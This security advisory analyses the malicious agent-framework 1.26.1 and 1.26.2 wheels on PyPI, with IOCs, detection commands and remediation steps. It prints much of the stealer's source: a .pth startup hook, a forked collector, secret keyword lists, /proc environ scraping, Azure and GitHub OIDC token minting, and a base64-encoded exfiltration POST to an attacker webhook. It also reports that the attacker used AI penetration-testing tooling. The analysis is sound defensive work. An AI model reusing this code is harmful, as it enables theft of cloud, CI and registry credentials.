---
id: collect-261121-veille-ia/copilot-microsoft/microsoft-agent-framework-1-26-1-and-1-26-2-on-pypi-ran-a-pth-credential-stealer-that-minted-azure-a
title: "Microsoft `agent-framework` 1.26.1 and 1.26.2 on PyPI ran a `.pth` credential stealer that minted Azure, Azure DevOps and GitHub Actions tokens | Corgea"
domain: copilot-microsoft
role: reference
task: article
actors: ["Microsoft"]
dates: ["2026-11-20"]
keywords: ["microsoft", "pypi", "azure", "agent-framework", "november", "github", "only", "actions"]
source: https://corgea.com/research/microsoft-agent-framework-pypi-1-26-1-1-26-2-pth-credential-stealer-november-2026
source_anchor: ""
source_lines: [1, 277]
section: "Copilot_Microsoft"
---
CVE

Not assigned

CWE

CWE-506, CWE-829, CWE-522

Affected Surface

- PyPI `agent-framework` 1.26.1 (wheel only, uploaded 17 November 2026 20:35 UTC, removed from the registry on 17 November 2026)
- PyPI `agent-framework` 1.26.2 (wheel only, uploaded 17 November 2026 21:08 UTC, removed from the registry on 17 November 2026)
- Any virtualenv, container image, CI runner or Azure workload that resolved an unpinned or `>=1.26` `agent-framework` requirement during that window
- Azure DevOps pipelines, GitHub Actions workflows with `id-token: write` (1.26.2 only), and Azure VMs, App Service, Functions or AKS nodes with a managed identity where the package was installed

**Update (20 November 2026):** Wiz has published a root cause. In an update to its post on 18 November, Wiz says the attacker “appears to have compromised a client certificate and private key for Microsoft ESRP (Engineering System Release Pipeline)”, the internal service Microsoft uses to sign and publish the package. ESRP’s IP filtering rejected the first publish attempt, which came from AWS. A second attempt from Microsoft-owned IP space went through. Wiz doesn’t know how the certificate and key were obtained. Wiz saw part of the operation because the attacker’s tooling reported its progress to the same public webhook[.]site URL it used for stolen data. Of the 50 requests webhook[.]site kept on its free tier, four came from the attacker, 29 looked like sandboxes, vendor scanners and tests, and the other 17 came from only three distinct victims whose data was successfully exfiltrated. The tooling calls itself Cairn, an open-source AI penetration-testing framework. It staged the package in `/tmp/cairn_pkg` and sent a probe named `CAIRN_ESRP_PROBE2`. Before publishing, the attacker ran the stealer on their own machine, and that run captured what Wiz reads as the open-source Pi agent harness with a GLM-family model (`pi_glm53`) behind a local proxy. Wiz hasn’t linked this to the May `durabletask` compromise, which used a stolen PyPI token. That root cause doesn’t involve `vibiret`, the second maintainer on the PyPI project, and Wiz’s post doesn’t mention the account. PyPA’s advisory PYSEC-2026-4388 says both versions were uploaded “without authorization” and that “PyPI Security worked with Microsoft to review the project’s accounts and complete remediation steps”. It credits Wiz as reporter and Microsoft for remediation. Microsoft told The Register on 18 November: “We have made some repositories private while we investigate malicious content.” The Register noted that the ONNX Runtime repositories had also gone dark, and that neither Microsoft nor researchers had linked that to the malware. On 20 November `microsoft/agent-framework`, `microsoft/onnxruntime` and `microsoft/onnxruntime-genai` still returned 404 from the GitHub API. Anything that fetches source or release archives from those repositories on GitHub will fail until Microsoft restores them. `agent-framework` 1.26.0 is still the latest version on PyPI. If you rely on federated or certificate-based publishing yourself, the takeaway is that a stolen signing-pipeline credential let the attacker skip the source repository entirely. Monitor the publish events on your registries, not only your commits.

## TL;DR

`agent-framework` is the PyPI metapackage for Microsoft Agent Framework, the Python SDK for building AI agents and multi-agent workflows on Azure AI Foundry, Azure OpenAI and other model providers. It gets roughly 190,000 to 200,000 downloads a month according to Wiz, SafeDep, Mend and Endor Labs. That figure covers all versions; nobody has published install counts for the two bad releases.

On 17 November 2026 two releases went up that do not exist in Microsoft’s repository:

- **`1.26.1`** at`20:35 UTC` , a single wheel.
- **`1.26.2`** at`21:08 UTC` , 33 minutes later, after PyPI had stopped serving 1.26.1. Same stealer, renamed files, plus GitHub Actions OIDC theft.

Both wheels drop a `.pth` file into `site-packages`. Python’s `site` module executes `import` lines in `.pth` files at every interpreter start, so the stealer runs whenever Python starts in that environment, including when `pip` itself runs. Nobody has to import `agent_framework`.

The stealer reads environment variables whose names look like secrets, credential files (`~/.azure`, `.npmrc`, `.netrc`, `.git-credentials`, `.docker/config.json`, Hugging Face tokens, Azure DevOps agent `.credentials`, `.env` files), and secret-looking entries from up to 300 other processes’ `/proc/<pid>/environ`. Then it asks the platform for new tokens: Azure managed-identity access tokens for 12 resources, an Azure DevOps federated OIDC token, and in 1.26.2, GitHub Actions ID tokens for the two audiences Azure federated credentials accept. Everything goes out in one HTTPS POST to `webhook[.]site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb`.

Both versions are off PyPI. `1.26.0` (12 November) is the last clean release. A Microsoft member of the project said on the repository’s issue tracker at `22:08 UTC` that both compromised versions had been pulled and that Microsoft is investigating. Wiz later traced the uploads to a stolen Microsoft ESRP client certificate and key (see the 20 November update). The `microsoft/agent-framework` GitHub repository has returned 404 since 17 November, after Microsoft made it private.

**What to do now:**

1. Search lockfiles, requirement files, CI logs and container images for `agent-framework``1.26.1` or`1.26.2` , and pin`agent-framework==1.26.0` .
2. On hosts and images, look for `agent_framework_meta.pth` ,`agent_framework_meta/_telemetry.py` ,`af_runtime_diag.pth` and`af_runtime_diag.py`**without starting that environment’s Python** . Starting it runs the stealer again.
3. If either version was installed, rebuild the environment, then rotate every secret that was in its environment or credential files. Revoke Azure DevOps and GitHub Actions credentials for affected jobs, and review Azure sign-in logs for every managed identity and federated credential the host or pipeline could use.

## Affected packages and projects

| Ecosystem | Package | Affected versions | Fixed or safe version | 
|---|---|---|---|
| PyPI | `agent-framework` | `1.26.1` (wheel only, sha256`d27fa344…3e989e110` , uploaded`20:35 UTC` 17 Nov 2026, removed from the registry on 17 Nov 2026) | `1.26.0` | 
| PyPI | `agent-framework` | `1.26.2` (wheel only, sha256`3d20a8bc…a9c9f7e0a9` , uploaded`21:08 UTC` 17 Nov 2026, removed from the registry on 17 Nov 2026) | `1.26.0` | 
| PyPI | `agent-framework-core` and other`agent-framework-*` packages | No new release since 12 November (Endor Labs checked 22 sibling packages; we confirmed `agent-framework-core` and`agent-framework-foundry` on PyPI on 18 November) | Current releases | 

**Watch list.** PyPI lists two maintainers on `agent-framework`: `microsoft` and `vibiret`. SafeDep reports that `vibiret` joined PyPI on 17 November and can also publish `agent-framework-openai`, `agent-framework-purview`, `agent-framework-redis`, `agent-framework-tools` and `agent-framework-postgres`. The first four install with `agent-framework` 1.26.0, because `agent-framework-core[all]==1.26.0` accepts any release of them below 2.0. PyPI doesn’t publish who uploaded a file, so nothing has confirmed that `vibiret` uploaded the bad wheels. On 18 November we confirmed the account is still listed on the `agent-framework` project page. Until Microsoft removes it, a new release of any of those siblings deserves a look before you take it.

## Technical analysis

### 1. How the releases differ from Microsoft’s

The package metadata (author `Microsoft <af-support@microsoft.com>`, project URLs, description) matches the real project, so the metadata gives nothing away. The tell is the shape of the release:

|  | Legitimate 1.20.0 to 1.26.0 | 1.26.1 and 1.26.2 | 
|---|---|---|
| Files | wheel and sdist | wheel only | 
| Sibling packages | `agent-framework-core` and siblings published within the same two minutes | none | 
| Core pin | matching `agent-framework-core` version | still `agent-framework-core[all]==1.26.0` | 
| Git tag | `python-1.x.y` tag in`microsoft/agent-framework` | no tag, and `main` doesn’t contain the code (Wiz) | 

Provenance wouldn’t have helped consumers here either. SafeDep and Endor Labs both note that 1.26.0 has no PyPI attestation, so the attacker’s uploads looked no different from Microsoft’s on that front. Because the core dependency pin is unchanged, the rest of the framework installs normally and applications keep working.

### 2. The trigger: a one-line `.pth` file

In 1.26.1 the wheel adds `agent_framework_meta.pth` (28 bytes) and appends a hook to the otherwise clean `agent_framework_meta/__init__.py` (the published code, via SafeDep and Endor Labs):

```
# agent_framework_meta.pth @ 1.26.1
import agent_framework_meta
```
```
# appended to agent_framework_meta/__init__.py @ 1.26.1
# Lightweight runtime diagnostics hook
try:
    from . import _telemetry as _telemetry
    _telemetry._start()
except Exception:
    pass
```
- `site.py` processes every`*.pth` in`site-packages` at startup and`exec` s any line that begins with`import` . That makes this a hook on every Python process in the environment: test runners, linters,`pip` itself, the application.
- The comment and module name (`_telemetry` ) are there to look like SDK telemetry in a quick diff review.
- `except Exception: pass` means a failure never surfaces as a traceback.

1.26.2 moves the payload out of the package. `agent_framework_meta/__init__.py` is restored byte for byte to the 1.26.0 file (SHA-256 `5f04333f…49f1`), and two new top-level files appear: `af_runtime_diag.pth` (23 bytes, `import af_runtime_diag`) and `af_runtime_diag.py`, which calls `_start()` at import. A detection keyed to the 1.26.1 file names or hashes misses 1.26.2. The webhook URL is the only indicator the two share.

### 3. Detaching from the host process

```
def _start():
    if os.environ.get("_AF_TEL"):          # run-once guard, inherited by children
        return
    os.environ["_AF_TEL"] = "1"
    try:
        if hasattr(os, "fork"):
            pid = os.fork()
            if pid == 0:                    # child
                try:
                    os.setsid()             # new session: survives the parent exiting
                except Exception:
                    pass
                _run()                      # collect and exfiltrate
                os._exit(0)
            return                          # parent returns at once: no visible delay
    except Exception:
        pass
    try:
        import threading                    # Windows / no fork: daemon thread instead
        t = threading.Thread(target=_run)
        t.daemon = True
        t.start()
    except Exception:
        pass
```
- The `_AF_TEL` guard lives only in the process environment. Child processes skip collection, but every fresh top-level Python launch (each CI step, each new shell) collects again. Endor Labs points out there is no on-disk marker, so finding no marker tells you nothing.
- `fork()` plus`setsid()` keeps collection running after a short-lived`pip install` or`pytest` process exits, and the parent shows no added latency.

### 4. What it reads

Environment variables are kept if their name contains one of 31 substrings in 1.26.1, including `TOKEN`, `SECRET`, `PASSWORD`, `KEY`, `AZURE`, `AWS`, `GITHUB`, `OPENAI`, `HF_`, `FOUNDRY`, `NPM`, `PIP`, `NUGET`, `SYSTEM`, `BUILD` and `AGENT`. 1.26.2 adds `ACTIONS`, `OIDC`, `RUNNER` and `ARM_`. Each value is truncated at 8,000 characters.

Credential files under 256 KB are read, up to 60 in 1.26.1 and 80 in 1.26.2: Azure CLI JSON under `~/.azure` and `/home/*/.azure`, `pip.conf`, `.npmrc`, `.netrc`, `.git-credentials`, Docker `config.json`, the Hugging Face token, Azure AI Foundry config, Azure DevOps self-hosted agent `.credentials` under `_work`, `vss-agent` and `/mnt/azure_nvme_temp`, plus `/app/.env`, `/app/*.json`, `/workspace/.env` and `~/.config/*/token*.json`. 1.26.2 adds `/home/runner/work/_temp/*` and `/home/runner/.azure`.

Other processes’ environments:

```
for e in glob.glob("/proc/[0-9]*/environ")[:300]:
    try:
        raw = open(e, "rb").read().decode("utf-8", "replace")
        hits = []
        for kv in raw.split("\x00"):
            if any(x in kv.upper() for x in ("TOKEN","SECRET","PASSWORD","KEY=","ENDPOINT_AUTH",
                                             "SYSTEM_ACCESSTOKEN","IDENTITY_HEADER")):
                hits.append(kv[:2000])
```
On a self-hosted or shared runner, or a container running as root, this reaches secrets that belong to other jobs and services, not just the Python process that loaded the hook. `IDENTITY_HEADER` is the App Service managed-identity header, so this also captures what it needs to call the identity endpoint itself.

### 5. Asking the platform for new tokens

The stealer doesn’t stop at stored secrets. Rotating what was on disk doesn’t cover tokens it minted.

**Azure DevOps.** With the job’s `System.AccessToken` it requests a federated token, the same one a workload identity federation service connection uses to sign in to Azure:

```
at = os.environ.get("SYSTEM_ACCESSTOKEN") or os.environ.get("SYSTEM_ACCESSTOKEN") or ""
oe = os.environ.get("SYSTEM_OIDCREQUESTURI") or ""
if oe and at:
    for suffix, body in [("?api-version=7.1", {"scopes": ["api://AzureADTokenExchange"]}), ("?api-version=7.1", {})]:
        try:
            req = urllib.request.Request(oe + suffix, data=json.dumps(body).encode(),
                headers={"Authorization": "Bearer " + at, "Content-Type": "application/json"}, method="POST")
            out["ado"]["oidc"] = urllib.request.urlopen(req, timeout=15).read().decode("utf-8", "replace")[:20000]
```
**Azure managed identity.** It calls `IDENTITY_ENDPOINT` / `MSI_ENDPOINT` on App Service and Functions, or IMDS at `169.254.169.254` elsewhere, once per resource, and also pulls instance metadata:

```
res = ["https://management.azure.com/","https://ai.azure.com/","https://ml.azure.com/",
       "https://cognitiveservices.azure.com/","https://storage.azure.com/","https://vault.azure.net",
       "https://search.azure.com","https://management.core.windows.net/","https://graph.microsoft.com/",
       "https://containerregistry.azure.net","499b84ac-1321-427f-aa17-267ca6975798",
       "api://AzureADTokenExchange"]
```
`499b84ac-1321-427f-aa17-267ca6975798` is the Azure DevOps resource ID. The list lines up with what an Agent Framework workload’s identity is likely to hold: Resource Manager, Key Vault, Storage, Graph, Container Registry, and the Azure AI, ML, Cognitive Services and Search endpoints.

**GitHub Actions (1.26.2 only).** In any job granted `id-token: write`:

```
u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL") or ""
t = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN") or os.environ.get("ACTIONS_RUNTIME_TOKEN") or ""
if u and t:
    for aud in ("api://AzureADTokenExchange", "https://management.azure.com/"):
        sep = "&" if "?" in u else "?"
        uu = u + sep + "audience=" + urllib.parse.quote(aud, safe="")
        req = urllib.request.Request(uu, headers={"Authorization": "Bearer " + t,
              "Accept": "application/json", "User-Agent": "runtime-diagnostics/1"})
        out["gh_oidc"][aud] = urllib.request.urlopen(req, timeout=12).read().decode("utf-8", "replace")[:20000]
```
Where an Entra ID federated credential trusts the repository or workflow, those ID tokens can be exchanged for Azure access with no stored secret. Wiz notes managed-identity and OIDC-exchanged tokens stay valid for up to 24 hours.

### 6. Exfiltration

```
_ENC = "aHR0cHM6Ly93ZWJob29rLnNpdGUvZDM4MWZkODAtZWM2Mi00MmFkLThmNWMtZDFiMTUxMDNjOWJi"
def _post(tag, data):
    try:
        import urllib.request
        u = base64.b64decode(_ENC).decode()                    # hxxps://webhook[.]site/d381fd80-...
        body = base64.b64encode(zlib.compress(json.dumps(data, default=str).encode("utf-8", "replace"), 9))
        req = urllib.request.Request(u + "?t=" + tag, data=body,
              headers={"Content-Type": "application/octet-stream", "User-Agent": "af-runtime-diagnostics/1"})
        urllib.request.urlopen(req, timeout=25).read()        # response read and discarded
    except Exception:
        pass
```
One POST to `?t=telemetry`, no fallback channel, no retry, no command handling. OpenSourceMalware and Endor Labs both found no second-stage download and nothing that executes the webhook’s response. The code has no remote-control features and installs no persistence beyond the `.pth` file and module, so removing those two files stops it.

Wiz confirmed the attacker’s webhook.site URL was on the free tier. Free URLs accept at most 100 requests and expire after 7 days, and Wiz says at most 50 requests were captured. That caps how many hosts’ data reached the attacker, but each of those requests can hold working cloud, CI and registry credentials. A `200` response in your egress logs means that host’s data was accepted. A `410` or `429` suggests it was refused.

## IOCs

| Type | Indicator | Notes | 
|---|---|---|
| Package | `pypi/agent-framework@1.26.1` | removed from the registry on 17 Nov 2026 | 
| Package | `pypi/agent-framework@1.26.2` | removed from the registry on 17 Nov 2026 | 
| Wheel SHA-256 | `d27fa34414e6201d5e03e559ef634f020057554d7b3f4898dd5d7cd3e989e110` | `agent_framework-1.26.1-py3-none-any.whl` | 
| Wheel SHA-256 | `3d20a8bc91351a9a16b6db243b848ceca0206b7a8623b02d2af553a9c9f7e0a9` | `agent_framework-1.26.2-py3-none-any.whl` | 
| File SHA-256 | `325e7e9f0ec94e41ad1a1b7a3f18a6b8b5bffece2e2b97b8d3369eb967452f93` | `af_runtime_diag.pth` (1.26.2) | 
| File SHA-256 | `54d885b7d7161c9ed96489c66364c4bfbf635929166843bba10d97d46b5a2e1f` | `af_runtime_diag.py` (1.26.2) | 
| File SHA-1 | `0a013e4724c4437cf9b177def1d988113e167539` | `agent_framework_meta/_telemetry.py` (1.26.1) | 
| File names | `agent_framework_meta.pth` ,`agent_framework_meta/_telemetry.py` | 1.26.1 | 
| File names | `af_runtime_diag.pth` ,`af_runtime_diag.py` | 1.26.2 | 
| URL | `hxxps://webhook[.]site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb?t=telemetry` | both versions. `webhook[.]site` itself is a shared service, so match on the UUID path | 
| User-Agent | `af-runtime-diagnostics/1` (1.26.1),`runtime-diagnostics/1` (1.26.2) | exfil and GitHub OIDC requests | 
| Environment | `_AF_TEL=1` | run-once marker in the process environment | 
| PyPI account | `vibiret` | joined 17 Nov 2026, maintainer on `agent-framework` and five siblings (SafeDep). Not confirmed as the uploader | 

## Detection and remediation

```
# 1. Lockfiles and requirement files
grep -rnE 'agent[-_]framework.{0,20}1\.26\.[12]\b' \
  --include='*.txt' --include='*.lock' --include='*.toml' --include='*.cfg' --include='*.in' .
# 2. Installed environments, images and runners: look for the startup files WITHOUT starting Python
find / -path '*site-packages/*' \( -name 'agent_framework_meta.pth' -o -name 'af_runtime_diag.pth' \
  -o -name 'af_runtime_diag.py' -o -path '*agent_framework_meta/_telemetry.py' \) 2>/dev/null
# 3. Package metadata on disk (no interpreter start needed)
find / -path '*site-packages/agent_framework-1.26.[12].dist-info' -type d 2>/dev/null
# 4. Every executable .pth line in a given environment (review anything unexpected)
grep -H '^import' /path/to/venv/lib/python3*/site-packages/*.pth
# 5. Container images: check layers for the dist-info
docker run --rm --entrypoint sh <image> -c \
  'ls -d /usr/local/lib/python3*/site-packages/agent_framework-* 2>/dev/null'
# 6. CI logs: pip output for the bad versions (GitHub Actions example)
gh run list --limit 200 --json databaseId --jq '.[].databaseId' | while read id; do
  gh run view "$id" --log 2>/dev/null | grep -qE 'agent[-_]framework-1\.26\.[12]' && echo "run $id"
done
# 7. Egress: proxy / DNS / firewall logs
grep -R 'd381fd80-ec62-42ad-8f5c-d1b15103c9bb' /var/log/proxy/ 2>/dev/null
```
Don’t run `pip show agent-framework` or `python -c ...` inside a suspect environment. Any interpreter start there runs the hook again. Use the `find` commands above, or inspect the image from outside.

If either version was installed:

1. Stop affected runners and jobs, delete the virtualenv or image, and rebuild from a lockfile pinned to `agent-framework==1.26.0` . Clear pip caches (`pip cache purge` ) and any wheel cache your CI restores.
2. Rotate every secret that was in the environment of the host or job, and every file in the list in section 4: Azure CLI sessions (`az logout` then re-login, and revoke refresh tokens for the user), Azure DevOps PATs and service connection secrets, npm, PyPI, NuGet, Docker and Hugging Face tokens, Git credentials, OpenAI and Azure OpenAI keys, and anything in`.env` files.
3. Treat secrets visible in other processes’ `/proc/*/environ` on the same host as exposed too.
4. For Azure managed identities reachable from the host (VM, App Service, Functions, AKS node pool): review sign-in logs and Azure activity logs from 17 November 20:35 UTC onward, and look for token use from unfamiliar IPs. Tokens already issued can’t be revoked one by one, so tighten role assignments if you see misuse.
5. For Azure DevOps pipelines with workload identity federation and GitHub workflows with `id-token: write` that installed 1.26.2: review sign-ins for the app registrations behind those federated credentials, and rotate repository and organization secrets exposed to the job.
6. Pin `agent-framework` and its siblings by version and hash (`pip install --require-hashes` ) until Microsoft confirms the publishing path is clean.

## Timeline

| Date (UTC) | Event | 
|---|---|
| 2026-11-12 18:25 | Legitimate `agent-framework` 1.26.0 published, wheel and sdist, alongside`agent-framework-core` 1.26.0 and siblings | 
| 2026-11-17 | PyPI account `vibiret` created (SafeDep) | 
| 2026-11-17 20:35 | `agent-framework` 1.26.1 published, wheel only | 
| 2026-11-17 20:54 | Upwind Security researcher reports 1.26.1 in an issue on `microsoft/agent-framework` (Cybersixt) | 
| 2026-11-17 20:57 | SafeDep flags 1.26.1 | 
| 2026-11-17 21:08 | `agent-framework` 1.26.2 published after PyPI stopped serving 1.26.1 | 
| 2026-11-17 21:12 | SafeDep flags 1.26.2 | 
| 2026-11-17 by 21:30 | Both versions no longer available on PyPI (Wiz) | 
| 2026-11-17 22:08 | Microsoft member of the repository says both versions were pulled and an investigation is underway (Cybersixt, SecurityWeek) | 
| 2026-11-18 00:31 | GitHub publishes malware advisory GHSA-764m-3ppc-5m73 | 
| 2026-11-18 | `vibiret` still listed as a maintainer on`agent-framework` .`microsoft/agent-framework` returns 404 on GitHub | 
| 2026-11-18 | Wiz updates its post: stolen ESRP client certificate and key, Cairn tooling, three distinct successful exfiltrations. Microsoft tells The Register it made some repositories private | 
| 2026-11-20 | `microsoft/agent-framework` ,`microsoft/onnxruntime` and`microsoft/onnxruntime-genai` still return 404.`1.26.0` is still the latest release on PyPI | 

## Related

This is the second Microsoft PyPI package with rogue releases this year, after `durabletask` 1.4.1 to 1.4.3 in May. SafeDep and Wiz found no shared payload or infrastructure between the two. The startup-hook technique, a one-line `.pth` that imports a module which forks a collector, is the same one used in LiteLLM 1.107.0 in October.

From research to remediation

## Check whether this pattern exists in your codebase

Turn this research into a remediation workflow. Scan dependencies and package manifests for similar supply-chain risk, then prioritize fixes with reachability context.
